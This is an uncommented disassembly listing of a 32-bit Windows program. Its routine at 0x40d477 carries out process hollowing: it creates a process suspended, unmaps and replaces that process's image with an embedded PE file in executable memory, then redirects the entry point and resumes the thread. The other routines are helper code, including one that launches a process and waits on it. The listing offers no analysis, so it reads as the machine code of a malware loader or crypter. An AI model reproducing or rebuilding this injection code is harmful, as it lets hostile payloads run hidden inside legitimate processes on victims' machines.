  40d014:	e8 c3 00 00 00       	call   0x40d0dc
  40d019:	83 c4 0c             	add    $0xc,%esp
  40d01c:	01 5e 08             	add    %ebx,0x8(%esi)
  40d01f:	eb 39                	jmp    0x40d05a
  40d021:	85 ff                	test   %edi,%edi
  40d023:	76 35                	jbe    0x40d05a
  40d025:	8d 3c 7f             	lea    (%edi,%edi,2),%edi
  40d028:	51                   	push   %ecx
  40d029:	c1 e7 02             	shl    $0x2,%edi
  40d02c:	51                   	push   %ecx
  40d02d:	2b cf                	sub    %edi,%ecx
  40d02f:	51                   	push   %ecx
  40d030:	8b ce                	mov    %esi,%ecx
  40d032:	e8 2a 00 00 00       	call   0x40d061
  40d037:	8b 46 08             	mov    0x8(%esi),%eax
  40d03a:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40d03d:	50                   	push   %eax
  40d03e:	2b c7                	sub    %edi,%eax
  40d040:	50                   	push   %eax
  40d041:	53                   	push   %ebx
  40d042:	e8 b6 00 00 00       	call   0x40d0fd
  40d047:	ff 75 10             	push   0x10(%ebp)
  40d04a:	8d 04 1f             	lea    (%edi,%ebx,1),%eax
  40d04d:	50                   	push   %eax
  40d04e:	53                   	push   %ebx
  40d04f:	e8 88 00 00 00       	call   0x40d0dc
  40d054:	83 c4 18             	add    $0x18,%esp
  40d057:	01 7e 08             	add    %edi,0x8(%esi)
  40d05a:	5f                   	pop    %edi
  40d05b:	5e                   	pop    %esi
  40d05c:	5b                   	pop    %ebx
  40d05d:	c9                   	leave
  40d05e:	c2 0c 00             	ret    $0xc
  40d061:	55                   	push   %ebp
  40d062:	8b ec                	mov    %esp,%ebp
  40d064:	56                   	push   %esi
  40d065:	8b 75 08             	mov    0x8(%ebp),%esi
  40d068:	57                   	push   %edi
  40d069:	8b f9                	mov    %ecx,%edi
  40d06b:	3b 75 0c             	cmp    0xc(%ebp),%esi
  40d06e:	74 14                	je     0x40d084
  40d070:	56                   	push   %esi
  40d071:	8b cf                	mov    %edi,%ecx
  40d073:	ff 75 10             	push   0x10(%ebp)
  40d076:	e8 4d 00 00 00       	call   0x40d0c8
  40d07b:	83 45 10 0c          	addl   $0xc,0x10(%ebp)
  40d07f:	83 c6 0c             	add    $0xc,%esi
  40d082:	eb e7                	jmp    0x40d06b
  40d084:	8b 45 10             	mov    0x10(%ebp),%eax
  40d087:	5f                   	pop    %edi
  40d088:	5e                   	pop    %esi
  40d089:	5d                   	pop    %ebp
  40d08a:	c2 0c 00             	ret    $0xc
  40d08d:	55                   	push   %ebp
  40d08e:	8b ec                	mov    %esp,%ebp
  40d090:	56                   	push   %esi
  40d091:	8b 75 0c             	mov    0xc(%ebp),%esi
  40d094:	57                   	push   %edi
  40d095:	8b f9                	mov    %ecx,%edi
  40d097:	85 f6                	test   %esi,%esi
  40d099:	76 14                	jbe    0x40d0af
  40d09b:	ff 75 10             	push   0x10(%ebp)
  40d09e:	8b cf                	mov    %edi,%ecx
  40d0a0:	ff 75 08             	push   0x8(%ebp)
  40d0a3:	e8 20 00 00 00       	call   0x40d0c8
  40d0a8:	83 45 08 0c          	addl   $0xc,0x8(%ebp)
  40d0ac:	4e                   	dec    %esi
  40d0ad:	75 ec                	jne    0x40d09b
  40d0af:	5f                   	pop    %edi
  40d0b0:	5e                   	pop    %esi
  40d0b1:	5d                   	pop    %ebp
  40d0b2:	c2 0c 00             	ret    $0xc
  40d0b5:	55                   	push   %ebp
  40d0b6:	8b ec                	mov    %esp,%ebp
  40d0b8:	6a 00                	push   $0x0
  40d0ba:	ff 75 08             	push   0x8(%ebp)
  40d0bd:	e8 63 00 00 00       	call   0x40d125
  40d0c2:	59                   	pop    %ecx
  40d0c3:	59                   	pop    %ecx
  40d0c4:	5d                   	pop    %ebp
  40d0c5:	c2 08 00             	ret    $0x8
  40d0c8:	55                   	push   %ebp
  40d0c9:	8b ec                	mov    %esp,%ebp
  40d0cb:	ff 75 0c             	push   0xc(%ebp)
  40d0ce:	ff 75 08             	push   0x8(%ebp)
  40d0d1:	e8 6a 00 00 00       	call   0x40d140
  40d0d6:	59                   	pop    %ecx
  40d0d7:	59                   	pop    %ecx
  40d0d8:	5d                   	pop    %ebp
  40d0d9:	c2 08 00             	ret    $0x8
  40d0dc:	55                   	push   %ebp
  40d0dd:	8b ec                	mov    %esp,%ebp
  40d0df:	8b 45 08             	mov    0x8(%ebp),%eax
  40d0e2:	3b 45 0c             	cmp    0xc(%ebp),%eax
  40d0e5:	74 14                	je     0x40d0fb
  40d0e7:	56                   	push   %esi
  40d0e8:	57                   	push   %edi
  40d0e9:	8b 75 10             	mov    0x10(%ebp),%esi
  40d0ec:	8b f8                	mov    %eax,%edi
  40d0ee:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d0ef:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d0f0:	83 c0 0c             	add    $0xc,%eax
  40d0f3:	3b 45 0c             	cmp    0xc(%ebp),%eax
  40d0f6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d0f7:	75 f0                	jne    0x40d0e9
  40d0f9:	5f                   	pop    %edi
  40d0fa:	5e                   	pop    %esi
  40d0fb:	5d                   	pop    %ebp
  40d0fc:	c3                   	ret
  40d0fd:	55                   	push   %ebp
  40d0fe:	8b ec                	mov    %esp,%ebp
  40d100:	8b 45 0c             	mov    0xc(%ebp),%eax
  40d103:	39 45 08             	cmp    %eax,0x8(%ebp)
  40d106:	74 18                	je     0x40d120
  40d108:	56                   	push   %esi
  40d109:	57                   	push   %edi
  40d10a:	83 6d 10 0c          	subl   $0xc,0x10(%ebp)
  40d10e:	83 e8 0c             	sub    $0xc,%eax
  40d111:	8b 7d 10             	mov    0x10(%ebp),%edi
  40d114:	8b f0                	mov    %eax,%esi
  40d116:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d117:	3b 45 08             	cmp    0x8(%ebp),%eax
  40d11a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d11b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d11c:	75 ec                	jne    0x40d10a
  40d11e:	5f                   	pop    %edi
  40d11f:	5e                   	pop    %esi
  40d120:	8b 45 10             	mov    0x10(%ebp),%eax
  40d123:	5d                   	pop    %ebp
  40d124:	c3                   	ret
  40d125:	55                   	push   %ebp
  40d126:	8b ec                	mov    %esp,%ebp
  40d128:	8b 45 08             	mov    0x8(%ebp),%eax
  40d12b:	85 c0                	test   %eax,%eax
  40d12d:	7d 02                	jge    0x40d131
  40d12f:	33 c0                	xor    %eax,%eax
  40d131:	8d 04 40             	lea    (%eax,%eax,2),%eax
  40d134:	c1 e0 02             	shl    $0x2,%eax
  40d137:	50                   	push   %eax
  40d138:	e8 8f 2b 00 00       	call   0x40fccc
  40d13d:	59                   	pop    %ecx
  40d13e:	5d                   	pop    %ebp
  40d13f:	c3                   	ret
  40d140:	55                   	push   %ebp
  40d141:	8b ec                	mov    %esp,%ebp
  40d143:	ff 75 08             	push   0x8(%ebp)
  40d146:	6a 0c                	push   $0xc
  40d148:	e8 d7 4a ff ff       	call   0x401c24
  40d14d:	59                   	pop    %ecx
  40d14e:	85 c0                	test   %eax,%eax
  40d150:	59                   	pop    %ecx
  40d151:	74 0c                	je     0x40d15f
  40d153:	56                   	push   %esi
  40d154:	8b 75 0c             	mov    0xc(%ebp),%esi
  40d157:	57                   	push   %edi
  40d158:	8b f8                	mov    %eax,%edi
  40d15a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d15b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d15c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d15d:	5f                   	pop    %edi
  40d15e:	5e                   	pop    %esi
  40d15f:	5d                   	pop    %ebp
  40d160:	c3                   	ret
  40d161:	e8 05 00 00 00       	call   0x40d16b
  40d166:	e9 0d 00 00 00       	jmp    0x40d178
  40d16b:	6a 00                	push   $0x0
  40d16d:	b9 78 5a 41 00       	mov    $0x415a78,%ecx
  40d172:	e8 6a 4f ff ff       	call   0x4020e1
  40d177:	c3                   	ret
  40d178:	68 84 d1 40 00       	push   $0x40d184
  40d17d:	e8 38 2b 00 00       	call   0x40fcba
  40d182:	59                   	pop    %ecx
  40d183:	c3                   	ret
  40d184:	b9 78 5a 41 00       	mov    $0x415a78,%ecx
  40d189:	e9 48 50 ff ff       	jmp    0x4021d6
  40d18e:	55                   	push   %ebp
  40d18f:	8b ec                	mov    %esp,%ebp
  40d191:	83 ec 10             	sub    $0x10,%esp
  40d194:	53                   	push   %ebx
  40d195:	bb 78 5a 41 00       	mov    $0x415a78,%ebx
  40d19a:	56                   	push   %esi
  40d19b:	57                   	push   %edi
  40d19c:	8b cb                	mov    %ebx,%ecx
  40d19e:	e8 66 4f ff ff       	call   0x402109
  40d1a3:	83 ec 10             	sub    $0x10,%esp
  40d1a6:	be 78 52 41 00       	mov    $0x415278,%esi
  40d1ab:	8b fc                	mov    %esp,%edi
  40d1ad:	8b cb                	mov    %ebx,%ecx
  40d1af:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d1b0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d1b1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d1b2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40d1b3:	e8 b0 4f ff ff       	call   0x402168
  40d1b8:	83 ec 10             	sub    $0x10,%esp
  40d1bb:	8d 45 08             	lea    0x8(%ebp),%eax
  40d1be:	8b f4                	mov    %esp,%esi
  40d1c0:	50                   	push   %eax
  40d1c1:	68 68 52 41 00       	push   $0x415268
  40d1c6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40d1c9:	68 60 13 41 00       	push   $0x411360
  40d1ce:	50                   	push   %eax
  40d1cf:	e8 46 2a 00 00       	call   0x40fc1a
  40d1d4:	83 c4 0c             	add    $0xc,%esp
  40d1d7:	50                   	push   %eax
  40d1d8:	56                   	push   %esi
  40d1d9:	e8 36 2a 00 00       	call   0x40fc14
  40d1de:	83 c4 0c             	add    $0xc,%esp
  40d1e1:	8b cb                	mov    %ebx,%ecx
  40d1e3:	e8 b0 4f ff ff       	call   0x402198
  40d1e8:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40d1eb:	ff 15 54 02 41 00    	call   *0x410254
  40d1f1:	6a 01                	push   $0x1
  40d1f3:	68 a5 d3 40 00       	push   $0x40d3a5
  40d1f8:	8b cb                	mov    %ebx,%ecx
  40d1fa:	e8 1d 50 ff ff       	call   0x40221c
  40d1ff:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40d202:	ff 15 54 02 41 00    	call   *0x410254
  40d208:	5f                   	pop    %edi
  40d209:	5e                   	pop    %esi
  40d20a:	5b                   	pop    %ebx
  40d20b:	c9                   	leave
  40d20c:	c3                   	ret
  40d20d:	55                   	push   %ebp
  40d20e:	8b ec                	mov    %esp,%ebp
  40d210:	81 ec fc 00 00 00    	sub    $0xfc,%esp
  40d216:	56                   	push   %esi
  40d217:	8d 45 08             	lea    0x8(%ebp),%eax
  40d21a:	57                   	push   %edi
  40d21b:	50                   	push   %eax
  40d21c:	8d 45 fe             	lea    -0x2(%ebp),%eax
  40d21f:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  40d222:	50                   	push   %eax
  40d223:	68 cc 08 41 00       	push   $0x4108cc
  40d228:	ff 15 4c 02 41 00    	call   *0x41024c
  40d22e:	50                   	push   %eax
  40d22f:	68 e4 0e 41 00       	push   $0x410ee4
  40d234:	ff 15 64 03 41 00    	call   *0x410364
  40d23a:	59                   	pop    %ecx
  40d23b:	50                   	push   %eax
  40d23c:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40d23f:	50                   	push   %eax
  40d240:	e8 d5 29 00 00       	call   0x40fc1a
  40d245:	83 c4 0c             	add    $0xc,%esp
  40d248:	50                   	push   %eax
  40d249:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40d24c:	50                   	push   %eax
  40d24d:	e8 c2 29 00 00       	call   0x40fc14
  40d252:	83 c4 0c             	add    $0xc,%esp
  40d255:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40d258:	ff 15 54 02 41 00    	call   *0x410254
  40d25e:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  40d261:	ff 15 54 02 41 00    	call   *0x410254
  40d267:	6a 01                	push   $0x1
  40d269:	6a 10                	push   $0x10
  40d26b:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40d26e:	ff 15 58 02 41 00    	call   *0x410258
  40d274:	50                   	push   %eax
  40d275:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  40d27b:	ff 15 2c 02 41 00    	call   *0x41022c
  40d281:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  40d287:	ff 15 30 02 41 00    	call   *0x410230
  40d28d:	84 c0                	test   %al,%al
  40d28f:	0f 84 c7 00 00 00    	je     0x40d35c
  40d295:	8d 45 18             	lea    0x18(%ebp),%eax
  40d298:	50                   	push   %eax
  40d299:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
  40d29f:	50                   	push   %eax
  40d2a0:	e8 a5 29 00 00       	call   0x40fc4a
  40d2a5:	59                   	pop    %ecx
  40d2a6:	59                   	pop    %ecx
  40d2a7:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  40d2ad:	ff 15 fc 02 41 00    	call   *0x4102fc
  40d2b3:	33 f6                	xor    %esi,%esi
  40d2b5:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40d2b8:	c7 45 b0 3c 00 00 00 	movl   $0x3c,-0x50(%ebp)
  40d2bf:	c7 45 b4 40 00 00 00 	movl   $0x40,-0x4c(%ebp)
  40d2c6:	89 75 b8             	mov    %esi,-0x48(%ebp)
  40d2c9:	89 75 bc             	mov    %esi,-0x44(%ebp)
  40d2cc:	ff 15 58 02 41 00    	call   *0x410258
  40d2d2:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40d2d5:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40d2d8:	50                   	push   %eax
  40d2d9:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  40d2dc:	89 75 c8             	mov    %esi,-0x38(%ebp)
  40d2df:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  40d2e6:	89 75 d0             	mov    %esi,-0x30(%ebp)
  40d2e9:	ff 15 c8 03 41 00    	call   *0x4103c8
  40d2ef:	85 c0                	test   %eax,%eax
  40d2f1:	0f 95 45 fe          	setne  -0x2(%ebp)
  40d2f5:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  40d2f8:	bf 78 5a 41 00       	mov    $0x415a78,%edi
  40d2fd:	74 3f                	je     0x40d33e
  40d2ff:	83 ec 10             	sub    $0x10,%esp
  40d302:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40d305:	8b cc                	mov    %esp,%ecx
  40d307:	50                   	push   %eax
  40d308:	68 98 17 41 00       	push   $0x411798
  40d30d:	ff 15 4c 02 41 00    	call   *0x41024c
  40d313:	8b cf                	mov    %edi,%ecx
  40d315:	e8 7e 4e ff ff       	call   0x402198
  40d31a:	6a ff                	push   $0xffffffff
  40d31c:	ff 75 e8             	push   -0x18(%ebp)
  40d31f:	ff 15 80 01 41 00    	call   *0x410180
  40d325:	ff 75 e8             	push   -0x18(%ebp)
  40d328:	ff 15 58 01 41 00    	call   *0x410158
  40d32e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40d331:	ff 15 58 02 41 00    	call   *0x410258
  40d337:	50                   	push   %eax
  40d338:	ff 15 50 01 41 00    	call   *0x410150
  40d33e:	80 7d fe 01          	cmpb   $0x1,-0x2(%ebp)
  40d342:	75 36                	jne    0x40d37a
  40d344:	83 ec 10             	sub    $0x10,%esp
  40d347:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40d34a:	8b cc                	mov    %esp,%ecx
  40d34c:	50                   	push   %eax
  40d34d:	68 84 17 41 00       	push   $0x411784
  40d352:	ff 15 4c 02 41 00    	call   *0x41024c
  40d358:	8b cf                	mov    %edi,%ecx
  40d35a:	eb 19                	jmp    0x40d375
  40d35c:	83 ec 10             	sub    $0x10,%esp
  40d35f:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40d362:	8b cc                	mov    %esp,%ecx
  40d364:	50                   	push   %eax
  40d365:	68 74 17 41 00       	push   $0x411774
  40d36a:	ff 15 4c 02 41 00    	call   *0x41024c
  40d370:	b9 78 5a 41 00       	mov    $0x415a78,%ecx
  40d375:	e8 1e 4e ff ff       	call   0x402198
  40d37a:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  40d380:	ff 15 f8 02 41 00    	call   *0x4102f8
  40d386:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40d389:	ff 15 54 02 41 00    	call   *0x410254
  40d38f:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40d392:	ff 15 54 02 41 00    	call   *0x410254
  40d398:	8d 4d 18             	lea    0x18(%ebp),%ecx
  40d39b:	ff 15 54 02 41 00    	call   *0x410254
  40d3a1:	5f                   	pop    %edi
  40d3a2:	5e                   	pop    %esi
  40d3a3:	c9                   	leave
  40d3a4:	c3                   	ret
  40d3a5:	55                   	push   %ebp
  40d3a6:	8b ec                	mov    %esp,%ebp
  40d3a8:	83 ec 30             	sub    $0x30,%esp
  40d3ab:	56                   	push   %esi
  40d3ac:	8b 75 08             	mov    0x8(%ebp),%esi
  40d3af:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40d3b2:	8d 46 18             	lea    0x18(%esi),%eax
  40d3b5:	50                   	push   %eax
  40d3b6:	ff 15 60 02 41 00    	call   *0x410260
  40d3bc:	ff 76 28             	push   0x28(%esi)
  40d3bf:	ff 15 64 01 41 00    	call   *0x410164
  40d3c5:	ff 76 28             	push   0x28(%esi)
  40d3c8:	ff 15 58 01 41 00    	call   *0x410158
  40d3ce:	83 ec 10             	sub    $0x10,%esp
  40d3d1:	8b cc                	mov    %esp,%ecx
  40d3d3:	68 68 52 41 00       	push   $0x415268
  40d3d8:	ff 15 60 02 41 00    	call   *0x410260
  40d3de:	83 ec 10             	sub    $0x10,%esp
  40d3e1:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40d3e4:	8b cc                	mov    %esp,%ecx
  40d3e6:	50                   	push   %eax
  40d3e7:	ff 15 60 02 41 00    	call   *0x410260
  40d3ed:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40d3f0:	50                   	push   %eax
  40d3f1:	e8 bf 1b 00 00       	call   0x40efb5
  40d3f6:	83 c4 24             	add    $0x24,%esp
  40d3f9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40d3fc:	6a 00                	push   $0x0
  40d3fe:	e8 86 3e ff ff       	call   0x401289
  40d403:	50                   	push   %eax
  40d404:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40d407:	ff 15 60 02 41 00    	call   *0x410260
  40d40d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40d410:	68 a8 17 41 00       	push   $0x4117a8
  40d415:	50                   	push   %eax
  40d416:	ff 15 38 02 41 00    	call   *0x410238
  40d41c:	59                   	pop    %ecx
  40d41d:	84 c0                	test   %al,%al
  40d41f:	59                   	pop    %ecx
  40d420:	74 34                	je     0x40d456
  40d422:	6a 02                	push   $0x2
  40d424:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40d427:	e8 5d 3e ff ff       	call   0x401289
  40d42c:	83 ec 10             	sub    $0x10,%esp
  40d42f:	8b cc                	mov    %esp,%ecx
  40d431:	50                   	push   %eax
  40d432:	ff 15 60 02 41 00    	call   *0x410260
  40d438:	6a 01                	push   $0x1
  40d43a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40d43d:	e8 47 3e ff ff       	call   0x401289
  40d442:	83 ec 10             	sub    $0x10,%esp
  40d445:	8b cc                	mov    %esp,%ecx
  40d447:	50                   	push   %eax
  40d448:	ff 15 60 02 41 00    	call   *0x410260
  40d44e:	e8 ba fd ff ff       	call   0x40d20d
  40d453:	83 c4 20             	add    $0x20,%esp
  40d456:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40d459:	ff 15 54 02 41 00    	call   *0x410254
  40d45f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40d462:	e8 d5 46 ff ff       	call   0x401b3c
  40d467:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40d46a:	ff 15 54 02 41 00    	call   *0x410254
  40d470:	33 c0                	xor    %eax,%eax
  40d472:	5e                   	pop    %esi
  40d473:	c9                   	leave
  40d474:	c2 04 00             	ret    $0x4
  40d477:	b8 c4 ff 40 00       	mov    $0x40ffc4,%eax
  40d47c:	e8 5d 28 00 00       	call   0x40fcde
  40d481:	83 ec 7c             	sub    $0x7c,%esp
  40d484:	53                   	push   %ebx
  40d485:	56                   	push   %esi
  40d486:	57                   	push   %edi
  40d487:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40d48a:	33 db                	xor    %ebx,%ebx
  40d48c:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40d48f:	68 bc 17 41 00       	push   $0x4117bc
  40d494:	68 b0 17 41 00       	push   $0x4117b0
  40d499:	ff 15 90 01 41 00    	call   *0x410190
  40d49f:	50                   	push   %eax
  40d4a0:	ff 15 44 01 41 00    	call   *0x410144
  40d4a6:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  40d4ac:	8b 45 0c             	mov    0xc(%ebp),%eax
  40d4af:	89 45 80             	mov    %eax,-0x80(%ebp)
  40d4b2:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%eax)
  40d4b7:	0f 85 55 01 00 00    	jne    0x40d612
  40d4bd:	8b 70 3c             	mov    0x3c(%eax),%esi
  40d4c0:	03 f0                	add    %eax,%esi
  40d4c2:	89 75 ec             	mov    %esi,-0x14(%ebp)
  40d4c5:	81 3e 50 45 00 00    	cmpl   $0x4550,(%esi)
  40d4cb:	0f 85 41 01 00 00    	jne    0x40d612
  40d4d1:	6a 11                	push   $0x11
  40d4d3:	59                   	pop    %ecx
  40d4d4:	33 c0                	xor    %eax,%eax
  40d4d6:	8d 7d a4             	lea    -0x5c(%ebp),%edi
  40d4d9:	f3 ab                	rep stos %eax,%es:(%edi)
  40d4db:	8d 7d 84             	lea    -0x7c(%ebp),%edi
  40d4de:	ab                   	stos   %eax,%es:(%edi)
  40d4df:	ab                   	stos   %eax,%es:(%edi)
  40d4e0:	ab                   	stos   %eax,%es:(%edi)
  40d4e1:	ab                   	stos   %eax,%es:(%edi)
  40d4e2:	8d 45 84             	lea    -0x7c(%ebp),%eax
  40d4e5:	50                   	push   %eax
  40d4e6:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40d4e9:	50                   	push   %eax
  40d4ea:	53                   	push   %ebx
  40d4eb:	53                   	push   %ebx
  40d4ec:	6a 04                	push   $0x4
  40d4ee:	5f                   	pop    %edi
  40d4ef:	57                   	push   %edi
  40d4f0:	53                   	push   %ebx
  40d4f1:	53                   	push   %ebx
  40d4f2:	53                   	push   %ebx
  40d4f3:	ff 75 08             	push   0x8(%ebp)
  40d4f6:	53                   	push   %ebx
  40d4f7:	ff 15 ac 00 41 00    	call   *0x4100ac
  40d4fd:	85 c0                	test   %eax,%eax
  40d4ff:	0f 84 0d 01 00 00    	je     0x40d612
  40d505:	57                   	push   %edi
  40d506:	68 00 10 00 00       	push   $0x1000
  40d50b:	57                   	push   %edi
  40d50c:	53                   	push   %ebx
  40d50d:	ff 15 f4 00 41 00    	call   *0x4100f4
  40d513:	8b d8                	mov    %eax,%ebx
  40d515:	89 5d 94             	mov    %ebx,-0x6c(%ebp)
  40d518:	c7 03 07 00 01 00    	movl   $0x10007,(%ebx)
  40d51e:	53                   	push   %ebx
  40d51f:	ff 75 88             	push   -0x78(%ebp)
  40d522:	ff 15 f0 00 41 00    	call   *0x4100f0
  40d528:	85 c0                	test   %eax,%eax
  40d52a:	0f 84 e2 00 00 00    	je     0x40d612
  40d530:	6a 00                	push   $0x0
  40d532:	57                   	push   %edi
  40d533:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40d536:	50                   	push   %eax
  40d537:	8b 83 a4 00 00 00    	mov    0xa4(%ebx),%eax
  40d53d:	83 c0 08             	add    $0x8,%eax
  40d540:	50                   	push   %eax
  40d541:	ff 75 84             	push   -0x7c(%ebp)
  40d544:	ff 15 ec 00 41 00    	call   *0x4100ec
  40d54a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40d54d:	3b 46 34             	cmp    0x34(%esi),%eax
  40d550:	75 0a                	jne    0x40d55c
  40d552:	50                   	push   %eax
  40d553:	ff 75 84             	push   -0x7c(%ebp)
  40d556:	ff 95 7c ff ff ff    	call   *-0x84(%ebp)
  40d55c:	6a 40                	push   $0x40
  40d55e:	68 00 30 00 00       	push   $0x3000
  40d563:	ff 76 50             	push   0x50(%esi)
  40d566:	ff 76 34             	push   0x34(%esi)
  40d569:	ff 75 84             	push   -0x7c(%ebp)
  40d56c:	ff 15 e8 00 41 00    	call   *0x4100e8
  40d572:	89 45 98             	mov    %eax,-0x68(%ebp)
  40d575:	85 c0                	test   %eax,%eax
  40d577:	0f 84 95 00 00 00    	je     0x40d612
  40d57d:	6a 00                	push   $0x0
  40d57f:	ff 76 54             	push   0x54(%esi)
  40d582:	ff 75 0c             	push   0xc(%ebp)
  40d585:	50                   	push   %eax
  40d586:	ff 75 84             	push   -0x7c(%ebp)
  40d589:	8b 3d e4 00 41 00    	mov    0x4100e4,%edi
  40d58f:	ff d7                	call   *%edi
  40d591:	33 c0                	xor    %eax,%eax
  40d593:	89 45 a0             	mov    %eax,-0x60(%ebp)
  40d596:	0f b7 4e 06          	movzwl 0x6(%esi),%ecx
  40d59a:	3b c1                	cmp    %ecx,%eax
  40d59c:	7d 35                	jge    0x40d5d3
  40d59e:	8d 04 80             	lea    (%eax,%eax,4),%eax
  40d5a1:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40d5a4:	8b 51 3c             	mov    0x3c(%ecx),%edx
  40d5a7:	8d 04 c2             	lea    (%edx,%eax,8),%eax
  40d5aa:	8d 84 08 f8 00 00 00 	lea    0xf8(%eax,%ecx,1),%eax
  40d5b1:	89 45 9c             	mov    %eax,-0x64(%ebp)
  40d5b4:	6a 00                	push   $0x0
  40d5b6:	ff 70 10             	push   0x10(%eax)
  40d5b9:	8b 50 14             	mov    0x14(%eax),%edx
  40d5bc:	03 d1                	add    %ecx,%edx
  40d5be:	52                   	push   %edx
  40d5bf:	8b 40 0c             	mov    0xc(%eax),%eax
  40d5c2:	03 45 98             	add    -0x68(%ebp),%eax
  40d5c5:	50                   	push   %eax
  40d5c6:	ff 75 84             	push   -0x7c(%ebp)
  40d5c9:	ff d7                	call   *%edi
  40d5cb:	ff 45 a0             	incl   -0x60(%ebp)
  40d5ce:	8b 45 a0             	mov    -0x60(%ebp),%eax
  40d5d1:	eb c3                	jmp    0x40d596
  40d5d3:	6a 00                	push   $0x0
  40d5d5:	6a 04                	push   $0x4
  40d5d7:	8d 46 34             	lea    0x34(%esi),%eax
  40d5da:	50                   	push   %eax
  40d5db:	8b 83 a4 00 00 00    	mov    0xa4(%ebx),%eax
  40d5e1:	83 c0 08             	add    $0x8,%eax
  40d5e4:	50                   	push   %eax
  40d5e5:	ff 75 84             	push   -0x7c(%ebp)
  40d5e8:	ff d7                	call   *%edi
  40d5ea:	8b 46 28             	mov    0x28(%esi),%eax
  40d5ed:	03 45 98             	add    -0x68(%ebp),%eax
  40d5f0:	89 83 b0 00 00 00    	mov    %eax,0xb0(%ebx)
  40d5f6:	53                   	push   %ebx
  40d5f7:	ff 75 88             	push   -0x78(%ebp)
  40d5fa:	ff 15 e0 00 41 00    	call   *0x4100e0
  40d600:	ff 75 88             	push   -0x78(%ebp)
  40d603:	ff 15 dc 00 41 00    	call   *0x4100dc
  40d609:	83 f8 ff             	cmp    $0xffffffff,%eax
  40d60c:	74 04                	je     0x40d612
  40d60e:	b0 01                	mov    $0x1,%al
  40d610:	eb 06                	jmp    0x40d618
  40d612:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  40d616:	32 c0                	xor    %al,%al
  40d618:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40d61b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40d622:	5f                   	pop    %edi
  40d623:	5e                   	pop    %esi
  40d624:	5b                   	pop    %ebx
  40d625:	c9                   	leave
  40d626:	c3                   	ret
  40d627:	b8 16 d6 40 00       	mov    $0x40d616,%eax
  40d62c:	c3                   	ret
  40d62d:	e8 05 00 00 00       	call   0x40d637
  40d632:	e9 0b 00 00 00       	jmp    0x40d642
  40d637:	b9 01 5b 41 00       	mov    $0x415b01,%ecx
  40d63c:	ff 25 dc 01 41 00    	jmp    *0x4101dc
  40d642:	68 4e d6 40 00       	push   $0x40d64e
  40d647:	e8 6e 26 00 00       	call   0x40fcba
  40d64c:	59                   	pop    %ecx
  40d64d:	c3                   	ret
  40d64e:	b9 01 5b 41 00       	mov    $0x415b01,%ecx
  40d653:	ff 25 e0 01 41 00    	jmp    *0x4101e0
  40d659:	e8 05 00 00 00       	call   0x40d663
  40d65e:	e9 0b 00 00 00       	jmp    0x40d66e
  40d663:	b9 00 5b 41 00       	mov    $0x415b00,%ecx
  40d668:	ff 25 e4 01 41 00    	jmp    *0x4101e4
  40d66e:	68 7a d6 40 00       	push   $0x40d67a
  40d673:	e8 42 26 00 00       	call   0x40fcba
  40d678:	59                   	pop    %ecx
  40d679:	c3                   	ret
  40d67a:	b9 00 5b 41 00       	mov    $0x415b00,%ecx
  40d67f:	ff 25 e8 01 41 00    	jmp    *0x4101e8
